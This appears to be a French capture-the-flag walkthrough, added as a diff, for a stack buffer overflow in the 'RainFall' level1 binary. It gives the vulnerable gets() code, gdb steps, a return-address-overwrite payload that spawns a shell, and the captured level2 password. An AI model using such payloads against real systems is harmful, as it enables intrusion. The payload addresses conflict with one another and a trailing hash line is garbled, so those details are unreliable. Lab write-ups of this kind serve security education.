@@ -1,0 +1,82 @@
+## Walkthrough du level 1
+
+### Objectif
+
+L'objectif du level 1 est d'exploiter une vulnérabilité dans le programme afin d'obtenir un shell.
+
+### Analyse du Code
+
+En décompilant le fichier du niveau 1, nous trouvons deux fonctions intéressantes :
+
+```c
+void main(void) {
+    char local_50[76];
+    gets(local_50);
+    return;
+}
+
+void run(void) {
+    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
+    system("/bin/sh");
+    return;
+}
+```
+
+### Comprendre la Vulnérabilité
+
+- La fonction main utilise gets, qui est vulnérable aux débordements de tampon. Elle lit l'entrée de l'utilisateur dans local_50, un tableau de 76 octets, sans vérifier la taille de l'entrée.
+
+- Fonction run
+  La fonction run affiche un message et exécute /bin/sh, ce qui nous permet d'obtenir un shell lorsque la fonction est appelée.
+
+##### Solution
+
+pour executer run nous allons overwrite l'addresse de retour de la fonction gets qui se trouve juste apres son parametre (ici local_50 ) donc en depassant la taille de local_50 (76 octets) nous devrions pouvoir remplacer l'addresse de retour de gets par l'addresse la fonction run qui sera donc executé
+
+### Etapes
+
+1. Trouver l'addresse de la fonction run
+
+```bash
+$ gdb ./level1
+$ (gdb) b run
+$ Breakpoint 1 at 0x804844a
+$ (gdb)
+```
+
+L'addresse de run est donc `0x804844a`
+
+2. Créez un payload qui écrase l'adresse de retour de main avec l'adresse de run.
+
+payload = b"A" \* 76 + b"\xb6\x84\x04\x08"
+Exécuter le Payload
+Fournissez le payload comme entrée au programme :
+bash
+
+### Construction du Payload avec Python :
+
+```bash
+(python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat -) | ./level1
+```
+
+- on crée une chaîne de 76 caractères 'A' suivie de l'adresse de run en little-endian.
+
+- Endianness : '\x44\x84\x04\x08' est l'adresse de run (qui est 0x08048444), correctement formatée en little-endian.
+
+- Utilisation de cat - :
+  cat - permet de lire l'entrée standard (stdin) et d'ajouter tout ce qui est tapé après la première partie de la commande. Cela signifie que si vous avez besoin d'entrer plus de données après le payload, cela sera également pris en compte.
+- Redirection vers ./level1 :
+  Le | redirige la sortie du premier processus (la commande Python) vers l'entrée standard de ./level1. Le programme reçoit alors le payload au moment où il attend une entrée et ca evite les soucis de format liée a l'addresse
+
+### Flag
+
+```bash
+level1@RainFall:~$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat -) | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+###
+
+ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
